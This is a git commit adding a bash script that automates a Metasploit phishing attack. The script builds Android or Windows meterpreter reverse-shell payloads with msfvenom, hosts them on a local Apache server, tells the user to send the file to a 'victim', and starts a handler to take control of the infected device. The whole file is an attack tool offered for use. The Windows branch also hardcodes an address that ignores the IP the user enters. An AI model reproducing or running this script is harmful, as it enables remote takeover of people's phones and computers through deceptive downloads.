bd983872e4b13a529eca3ea7a9f5e5f231b22ff6
Arpan <84536424+Arpan301@users.noreply.github.com>
2021-05-28 20:33:00 +0530

    Add files via upload

---
+++ msf_auto.sh
@@ -0,0 +1,54 @@
+#! /bin/bash
+echo "********************  ************************"
+echo "********************  ************************"
+echo "********************  ************************"
+echo "****************	       *********************"
+echo "************		 *******************"
+echo "*********			    ****************"
+echo "       AUTOMATE MSF APACHE2 WEB PHISING       "
+echo "*********                     ****************"
+echo "************               *******************"
+echo "****************         *********************"
+echo "********************  ************************"
+echo "********************  ************************"
+echo "********************  ************************"
+echo "YOU NEED TO BE ROOT"
+echo " Note that this automation "
+echo " does not involve firewall / privilege Escalation Detection "
+echo " This tool has the ability to create shell on both android and windows "
+echo " press 1 for android and 2 for windows "                     
+read options                                                                  
+service postgresql start                      
+service tor start
+service apache2 start
+echo "enter your ip"
+read  ipp 
+touch m.rc       
+echo use exploit/multi/handler >> m.rc                  
+echo set payload android/meterpreter/reverse_tcp >> m.rc
+echo set LHOST $ipp >> m.rc         
+echo set LPORT 4444 >> m.rc                             
+echo exploit >> m.rc         
+touch mr.rc                 
+echo use exploit/multi/handler >> mr.rc
+echo set payload windows/meterpreter/reverse_tcp >> mr.rc
+echo set LHOST $ipp >> mr.rc         
+echo set LPORT 1234 >> mr.rc                             
+echo exploit >> mr.rc         
+
+if [ "$options" == "1" ];
+then
+	echo "send it to victim on same network "$ipp"/FILENAME.apk"
+        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$ipp LPORT=4444  R >FILENAME.apk
+	cp FILENAME.apk /var/www/html
+        msfconsole -r m.rc                                       
+fi
+if [ "$options" == "2" ];
+then 
+	echo "send it to victim on same network "$ipp"/window.exe"
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.9 lport=1234 -f exe > window.exe
+	cp window.exe /var/www/html 
+	msfconsole -r mr.rc
+fi
+rm m.rc mr.rc
+
